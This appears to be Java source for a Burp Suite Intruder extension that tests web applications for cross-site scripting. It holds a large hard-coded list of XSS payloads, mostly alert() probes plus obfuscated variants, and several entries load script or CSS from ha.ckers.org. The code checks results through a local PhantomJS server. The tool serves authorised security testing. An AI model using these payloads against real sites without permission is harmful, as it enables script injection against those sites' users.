package burp;
import burp.*;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicHeader;
import org.apache.http.util.EntityUtils;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import org.apache.commons.codec.binary.Base64;


public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor	{
	public burp.IBurpExtenderCallbacks mCallbacks;
	private IExtensionHelpers helpers;
	private PrintWriter stdout;
    private PrintWriter stderr;
    
    private HttpClient client;
    
    private static String phantomServer = "http://127.0.0.1:8093";
	
    /**
     * Initial Payloads. Will add capability to load from file
     */
	public static final byte[][] PAYLOADS = {
		"<script>alert(1)</script>".getBytes(),
		"<SCRIPT>alert('XSS');</SCRIPT>".getBytes(),
		"'';!--\"<XSS>=&{()}".getBytes(),
		"<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>".getBytes(),
		"<IMG SRC=\"javascript:alert('XSS');\">".getBytes(),
		"<IMG SRC=javascript:alert('XSS')>".getBytes(),
		"<IMG SRC=JaVaScRiPt:alert('XSS')>".getBytes(),
		"<IMG SRC=javascript:alert(&quot;XSS&quot;)>".getBytes(),
		"<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>".getBytes(),
		"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>".getBytes(),
		"SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>".getBytes(),
		"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>".getBytes(),
		"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>".getBytes(),
		"<IMG SRC=\"jav	ascript:alert('XSS');\">".getBytes(),
		"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">".getBytes(),
		"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">".getBytes(),
		"<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">".getBytes(),
		"<IMG SRC=\" &#14;  javascript:alert('XSS');\">".getBytes(),
		"<IMG%0aSRC%0a=%0a\"%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a'%0aX%0aS%0aS%0a'%0a)%0a\"%0a>".getBytes(),
		"<IMG SRC=java%00script:alert(\\\"XSS\\\")>".getBytes(),
		"<SCR%00IPT>alert(\\\"XSS\\\")</SCR%00IPT>".getBytes(),
		"<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>".getBytes(),
		"<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>".getBytes(),
		"<IMG SRC=\"javascript:alert('XSS')\"".getBytes(),
		"<SCRIPT>a=/XSS/".getBytes(),
		"\\\";alert('XSS');//".getBytes(),
		"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">".getBytes(),
		"<BODY BACKGROUND=\"javascript:alert('XSS')\">".getBytes(),
		"<BODY ONLOAD=alert('XSS')>".getBytes(),
		"<IMG DYNSRC=\"javascript:alert('XSS')\">".getBytes(),
		"<IMG LOWSRC=\"javascript:alert('XSS')\">".getBytes(),
		"<BGSOUND SRC=\"javascript:alert('XSS');\">".getBytes(),
		"<BR SIZE=\"&{alert('XSS')}\">".getBytes(),
		"<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>".getBytes(),
		"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">".getBytes(),
		"<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">".getBytes(),
		"<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>".getBytes(),
		"<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">".getBytes(),
		"<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>".getBytes(),
		"<IMG SRC='vbscript:msgbox(\"XSS\")'>".getBytes(),
		"<IMG SRC=\"mocha:[code]\">".getBytes(),
		"<IMG SRC=\"livescript:[code]\">".getBytes(),
		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">".getBytes(),
		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">".getBytes(),
		"<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('XSS')>; REL=stylesheet\">".getBytes(),
		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">".getBytes(),
		"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>".getBytes(),
		"<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>".getBytes(),
		"<TABLE BACKGROUND=\"javascript:alert('XSS')\">".getBytes(),
		"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">".getBytes(),
		"<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">".getBytes(),
		"<DIV STYLE=\"width: expression(alert('XSS'));\">".getBytes(),
		"<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>".getBytes(),
		"<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">".getBytes(),
		"<XSS STYLE=\"xss:expression(alert('XSS'))\">".getBytes(),
		"exp/*<XSS STYLE='no\\xss:noxss(\"*//*\");".getBytes(),
		"<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>".getBytes(),
		"<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>".getBytes(),
		"<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>".getBytes(),
		"<BASE HREF=\"javascript:alert('XSS');//\">".getBytes(),
		"<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>".getBytes(),
		"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>".getBytes(),
		"getURL(\"javascript:alert('XSS')\")".getBytes(),
		"a=\"get\";".getBytes(),
		"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('XSS');\">".getBytes(),
		"<XML SRC=\"http://ha.ckers.org/xsstest.xml\" ID=I></XML>".getBytes(),
		"<HTML><BODY>".getBytes(),
		"<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>".getBytes(),
		"<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'\"-->".getBytes(),
		"<? echo('<SCR)';".getBytes(),
		"<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">".getBytes(),
		"<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-".getBytes(),
		"<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>".getBytes(),
		"<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>".getBytes(),
		"<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>".getBytes(),
		"<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>".getBytes(),
		"<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>".getBytes()
	};
	
	
	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
		mCallbacks = callbacks;
		
		this.client = HttpClientBuilder.create().build();
		helpers = callbacks.getHelpers();
		callbacks.setExtensionName("XSS Auditor Payloads");
		stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
		callbacks.registerIntruderPayloadGeneratorFactory(this);
		callbacks.registerIntruderPayloadProcessor(this);
		callbacks.registerHttpListener(this);
	}
	
	@Override
	public String getGeneratorName() {
		return "XSS Auditor Payloads";
	}
	
	@Override
    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack)
    {
        // return a new IIntruderPayloadGenerator to generate payloads for this attack
        return new IntruderPayloadGenerator();
    }

    //
    // implement IIntruderPayloadProcessor
    //
    
    @Override
    public String getProcessorName() {
        return "XSS Validator";
    }
    
    @Override
    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload, byte[] baseValue) {
    	return helpers.stringToBytes(helpers.urlEncode(helpers.bytesToString(currentPayload)));
    }
    
	public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (toolFlag == 32 && messageIsRequest) {
        	// Manipulate intruder request, if necessary
        } else if (toolFlag == 32 && ! messageIsRequest) {
        	stdout.println("Response Received");
        	HttpPost PhantomJs = new HttpPost(phantomServer);
        	
        	try {
        		byte[] encodedBytes = Base64.encodeBase64(messageInfo.getResponse());
        		String encodedResponse = helpers.bytesToString(encodedBytes);
        		
	        	List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
	        	nameValuePairs.add(new BasicNameValuePair("http-response", encodedResponse));
	        	
	        	PhantomJs.setEntity(new UrlEncodedFormEntity(nameValuePairs));

	        	HttpResponse response = client.execute(PhantomJs);
	        	String responseAsString = EntityUtils.toString(response.getEntity());
	            
            	stdout.println("Response: " + responseAsString);
            	
	            // parse response for XSS
	            if(responseAsString.contains("message")) {
	            	// Append weird string to identify XSS
		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
	            	stdout.println("XSS Found");
	            }
	            
        	} catch (Exception e) {
        		stderr.println(e.getMessage());
        	}
        }
	}
		
	class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
		int payloadIndex;
		
		@Override
		public boolean hasMorePayloads() {
			return payloadIndex < PAYLOADS.length;
		}
		
		@Override
		public byte[] getNextPayload(byte[] baseValue) {			
			byte[] payload = PAYLOADS[payloadIndex];
			payloadIndex++;
			return payload;
		}
		
		@Override
		public void reset() {
			payloadIndex = 0;
		}
		
	}
}
